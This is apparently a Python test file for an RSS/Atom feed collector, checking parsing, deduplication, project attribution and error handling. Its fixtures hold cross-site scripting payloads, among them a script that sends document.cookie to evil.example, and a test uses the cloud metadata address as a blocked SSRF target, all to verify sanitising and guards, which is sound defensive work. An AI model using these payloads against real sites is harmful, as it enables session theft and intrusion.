# -*- coding: utf-8 -*-
"""
End-to-end tests for the RSS/Atom ingestion path.

Covers: RSS 2.0 and Atom parsing, entry limits, malformed feeds, feed-HTML
sanitisation, deduplication across runs, project attribution, and propagation of
SSRF/fetch guard failures into honest source-level errors.

No network access: app.services.feed_fetcher.fetch_url is stubbed with local
fixture bytes. Fixture content is only ever used to exercise the parser and the
storage path — it is never presented as production data.
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
os.environ.setdefault("DATABASE_URL", "sqlite:///test_rss_ingestion.db")
os.environ.setdefault("SECRET_KEY", "test-secret-key-for-tests")
os.environ.setdefault("ENVIRONMENT", "test")

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.core.database import Base
from app.models.keyword import Keyword, KeywordGroup
from app.models.mention import Mention
from app.models.source import CrawlFrequency, Source, SourceType
from app.models.source_item import SourceItem
from app.services import rss_collector
from app.services.feed_fetcher import FeedFetchResult
from app.services.rss_collector import fetch_and_parse_feed, run_rss_collector, sanitize_feed_html

TEST_DB_URL = "sqlite:///test_rss_ingestion.db"
engine = create_engine(TEST_DB_URL, echo=False)
TestSession = sessionmaker(bind=engine, expire_on_commit=False, autocommit=False, autoflush=False)


# ─── Fixtures ─────────────────────────────────────────────────────────────────

RSS_FEED = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>Fixture News</title>
    <item>
      <title>Nope360 ra mat tinh nang moi</title>
      <link>https://fixture-news.example/bai-viet-1.html</link>
      <guid>fixture-news-1</guid>
      <author>Phong Vien A</author>
      <pubDate>Mon, 20 Jul 2026 08:00:00 +0000</pubDate>
      <description><![CDATA[<p>Ban tin ve Nope360 va thi truong.</p>]]></description>
    </item>
    <item>
      <title>Tin khong lien quan</title>
      <link>https://fixture-news.example/bai-viet-2.html</link>
      <guid>fixture-news-2</guid>
      <pubDate>Mon, 20 Jul 2026 09:00:00 +0000</pubDate>
      <description>Noi dung khong chua tu khoa nao.</description>
    </item>
  </channel>
</rss>
"""

ATOM_FEED = """<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fixture Atom</title>
  <entry>
    <title>Nope360 mo rong nguon du lieu</title>
    <link href="https://fixture-atom.example/entry-1"/>
    <id>urn:uuid:fixture-atom-1</id>
    <updated>2026-07-21T10:30:00Z</updated>
    <author><name>Tac Gia Atom</name></author>
    <summary>Atom summary ve Nope360.</summary>
  </entry>
</feed>
"""

# Not a feed at all: feedparser flags it and yields no entries.
MALFORMED_FEED = b"\x00\x01\x02 this is not xml and never was <<<>>>"

# The HTML a feed puts inside <description>/<content>, extracted for direct
# sanitiser tests (inside the feed it arrives as a CDATA text node).
HOSTILE_ITEM_HTML = (
    '<p onclick="steal()">Noi dung Nope360</p>'
    "<script>fetch('https://evil.example/x?c='+document.cookie)</script>"
    '<img src="x" onerror="alert(1)"/>'
    '<a href="javascript:alert(2)">link</a>'
    '<iframe src="https://evil.example/frame"></iframe>'
)

HOSTILE_FEED = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <item>
      <title>Nope360 tin co ma doc</title>
      <link>https://fixture-news.example/hostile.html</link>
      <guid>fixture-hostile-1</guid>
      <pubDate>Tue, 21 Jul 2026 08:00:00 +0000</pubDate>
      <description><![CDATA[
        <p onclick="steal()">Noi dung Nope360</p>
        <script>fetch('https://evil.example/x?c='+document.cookie)</script>
        <img src="x" onerror="alert(1)"/>
        <a href="javascript:alert(2)">link</a>
        <iframe src="https://evil.example/frame"></iframe>
      ]]></description>
    </item>
  </channel>
</rss>
"""


def _ok(payload: str | bytes, content_type: str = "application/rss+xml") -> FeedFetchResult:
    content = payload.encode("utf-8") if isinstance(payload, str) else payload
    return FeedFetchResult(ok=True, content=content, final_url="https://fixture.example/feed", content_type=content_type)


@pytest.fixture(autouse=True)
def _fresh_db():
    Base.metadata.drop_all(engine)
    Base.metadata.create_all(engine)
    yield
    Base.metadata.drop_all(engine)


@pytest.fixture
def db():
    session = TestSession()
    try:
        yield session
    finally:
        session.close()


@pytest.fixture
def no_ai(monkeypatch):
    """The collector calls the AI service opportunistically; keep it offline."""
    monkeypatch.setattr(
        "app.services.ai_service.analyze_mention",
        lambda *a, **k: {"status": "skipped"},
        raising=False,
    )


def _seed_project_with_keyword(db, keyword: str = "Nope360", group_name: str = "Du an Nope360"):
    group = KeywordGroup(name=group_name, is_active=True)
    db.add(group)
    db.flush()
    kw = Keyword(group_id=group.id, keyword=keyword, is_active=True, is_excluded=False)
    db.add(kw)
    db.commit()
    return group, kw


def _seed_source(db, url="https://fixture-news.example/rss", name="Fixture News RSS"):
    source = Source(
        name=name,
        source_type=SourceType.RSS,
        url=url,
        platform="web",
        is_active=True,
        crawl_frequency=CrawlFrequency.MANUAL,
    )
    db.add(source)
    db.commit()
    return source


# ─── Parser-level ─────────────────────────────────────────────────────────────

class TestFeedParsing:
    def test_parses_rss_items_with_metadata(self, monkeypatch):
        monkeypatch.setattr(rss_collector, "fetch_url", lambda *a, **k: _ok(RSS_FEED))
        result = fetch_and_parse_feed("https://fixture-news.example/rss")

        assert result["success"] is True
        assert len(result["items"]) == 2

        first = result["items"][0]
        assert first["title"] == "Nope360 ra mat tinh nang moi"
        assert first["url"] == "https://fixture-news.example/bai-viet-1.html"
        assert first["guid"] == "fixture-news-1"
        assert first["author"] == "Phong Vien A"
        assert first["domain"] == "fixture-news.example"
        assert first["published_at"] is not None
        assert first["published_at"].year == 2026
        assert "Nope360" in first["snippet"]

    def test_parses_atom_entries(self, monkeypatch):
        monkeypatch.setattr(rss_collector, "fetch_url", lambda *a, **k: _ok(ATOM_FEED, "application/atom+xml"))
        result = fetch_and_parse_feed("https://fixture-atom.example/feed")

        assert result["success"] is True
        assert len(result["items"]) == 1
        entry = result["items"][0]
        assert entry["title"] == "Nope360 mo rong nguon du lieu"
        assert entry["url"] == "https://fixture-atom.example/entry-1"
        assert entry["guid"] == "urn:uuid:fixture-atom-1"
        assert entry["author"] == "Tac Gia Atom"
        assert entry["published_at"] is not None

    def test_malformed_feed_returns_error_instead_of_raising(self, monkeypatch):
        monkeypatch.setattr(rss_collector, "fetch_url", lambda *a, **k: _ok(MALFORMED_FEED))
        result = fetch_and_parse_feed("https://fixture-news.example/broken")
        assert result["success"] is False
        assert result["error"]
        assert result.get("error_code") == "invalid_xml"

    def test_respects_entry_limit(self, monkeypatch):
        monkeypatch.setattr(rss_collector, "fetch_url", lambda *a, **k: _ok(RSS_FEED))
        result = fetch_and_parse_feed("https://fixture-news.example/rss", max_entries=1)
        assert result["success"] is True
        assert len(result["items"]) == 1

    def test_fetch_guard_failure_is_reported_honestly(self, monkeypatch):
        monkeypatch.setattr(
            rss_collector, "fetch_url",
            lambda *a, **k: FeedFetchResult(
                ok=False, error_code="blocked_target", error_message="URL trỏ tới địa chỉ nội bộ nên không được phép."
            ),
        )
        result = fetch_and_parse_feed("http://169.254.169.254/latest/meta-data/")
        assert result["success"] is False
        assert result["error_code"] == "blocked_target"


class TestSanitizeFeedHtml:
    def test_removes_script_and_active_content(self):
        cleaned = sanitize_feed_html(HOSTILE_ITEM_HTML)
        lowered = cleaned.lower()
        assert "<script" not in lowered
        assert "<iframe" not in lowered
        assert "onerror" not in lowered
        assert "onclick" not in lowered
        assert "javascript:" not in lowered

    def test_keeps_readable_markup(self):
        cleaned = sanitize_feed_html("<p>Xin chao <b>Nope360</b></p>")
        assert "Nope360" in cleaned
        assert "<b>" in cleaned

    def test_handles_empty_input(self):
        assert sanitize_feed_html("") == ""
        assert sanitize_feed_html(None) == ""


# ─── Collection → storage ─────────────────────────────────────────────────────

class TestRunRssCollector:
    def test_stores_source_items_and_matched_mention(self, db, monkeypatch, no_ai):
        group, _ = _seed_project_with_keyword(db)
        source = _seed_source(db)
        monkeypatch.setattr(rss_collector, "fetch_url", lambda *a, **k: _ok(RSS_FEED))

        result = run_rss_collector(db)

        assert result["status"] == "COMPLETED"
        assert result["sources_scanned"] == 1
        assert result["items_seen"] == 2
        assert result["source_items_created"] == 2
        # Only the item containing the keyword becomes a mention.
        assert result["mentions_created"] == 1

        items = db.query(SourceItem).all()
        assert {i.source_name for i in items} == {source.name}
        assert all(i.source_type == "rss" for i in items)
        assert all(i.published_at is not None for i in items)

        mention = db.query(Mention).one()
        assert mention.title == "Nope360 ra mat tinh nang moi"
        assert mention.source_type == "rss"
        assert mention.extraction_source == "rss"
        assert mention.domain == "fixture-news.example"
        assert mention.matched_keywords[0]["keyword"] == "Nope360"

    def test_attributes_mention_to_project_of_matched_keyword(self, db, monkeypatch, no_ai):
        # A different project owns the first active keyword; the matching keyword
        # belongs to the second project. The mention must land on the second.
        other = KeywordGroup(name="Du an khac", is_active=True)
        db.add(other)
        db.flush()
        db.add(Keyword(group_id=other.id, keyword="TuKhoaKhongXuatHien", is_active=True, is_excluded=False))
        db.commit()

        target_group, _ = _seed_project_with_keyword(db)
        _seed_source(db)
        monkeypatch.setattr(rss_collector, "fetch_url", lambda *a, **k: _ok(RSS_FEED))

        result = run_rss_collector(db)

        assert result["mentions_created"] == 1
        mention = db.query(Mention).one()
        assert mention.project_id == target_group.id
        assert mention.project_id != other.id

    def test_second_run_deduplicates_instead_of_reimporting(self, db, monkeypatch, no_ai):
        _seed_project_with_keyword(db)
        _seed_source(db)
        monkeypatch.setattr(rss_collector, "fetch_url", lambda *a, **k: _ok(RSS_FEED))

        first = run_rss_collector(db)
        second = run_rss_collector(db)

        assert first["source_items_created"] == 2
        assert second["source_items_created"] == 0
        assert second["duplicates_skipped"] == 2
        assert second["mentions_created"] == 0
        assert db.query(SourceItem).count() == 2
        assert db.query(Mention).count() == 1

    def test_stored_mention_content_is_sanitized(self, db, monkeypatch, no_ai):
        _seed_project_with_keyword(db)
        _seed_source(db)
        monkeypatch.setattr(rss_collector, "fetch_url", lambda *a, **k: _ok(HOSTILE_FEED))

        run_rss_collector(db)

        mention = db.query(Mention).one()
        stored = (mention.content or "").lower()
        assert "<script" not in stored
        assert "onerror" not in stored
        assert "javascript:" not in stored

    def test_one_failing_source_does_not_stop_the_others(self, db, monkeypatch, no_ai):
        _seed_project_with_keyword(db)
        bad = _seed_source(db, url="https://bad.example/rss", name="Bad feed")
        good = _seed_source(db, url="https://fixture-news.example/rss", name="Good feed")

        def _fetch(url, *a, **k):
            if "bad.example" in url:
                return FeedFetchResult(ok=False, error_code="http_error", error_message="Nguồn trả về lỗi HTTP.")
            return _ok(RSS_FEED)

        monkeypatch.setattr(rss_collector, "fetch_url", _fetch)

        result = run_rss_collector(db)

        assert result["status"] == "PARTIAL_FAILED"
        assert len(result["errors"]) == 1
        assert result["errors"][0]["source_id"] == bad.id
        # The healthy source still produced data.
        assert result["source_items_created"] == 2
        assert result["mentions_created"] == 1

        db.refresh(bad)
        db.refresh(good)
        # Stored as "<code>: <message>" so the Sources UI can key off the code.
        assert bad.last_error == "http_error: Nguồn trả về lỗi HTTP."
        assert bad.error_count == 1
        assert good.last_error is None
        assert good.last_success_at is not None

    def test_only_active_rss_sources_are_scanned(self, db, monkeypatch, no_ai):
        _seed_project_with_keyword(db)
        active = _seed_source(db)
        inactive = _seed_source(db, url="https://fixture-news.example/rss-off", name="Disabled feed")
        inactive.is_active = False
        db.commit()

        seen_urls = []

        def _fetch(url, *a, **k):
            seen_urls.append(url)
            return _ok(RSS_FEED)

        monkeypatch.setattr(rss_collector, "fetch_url", _fetch)
        result = run_rss_collector(db)

        assert result["sources_scanned"] == 1
        assert seen_urls == [active.url]

    def test_source_id_filter_limits_the_run(self, db, monkeypatch, no_ai):
        _seed_project_with_keyword(db)
        first = _seed_source(db)
        second = _seed_source(db, url="https://fixture-atom.example/feed", name="Atom feed")

        seen_urls = []

        def _fetch(url, *a, **k):
            seen_urls.append(url)
            return _ok(ATOM_FEED, "application/atom+xml")

        monkeypatch.setattr(rss_collector, "fetch_url", _fetch)
        result = run_rss_collector(db, source_ids=[second.id])

        assert result["sources_scanned"] == 1
        assert seen_urls == [second.url]
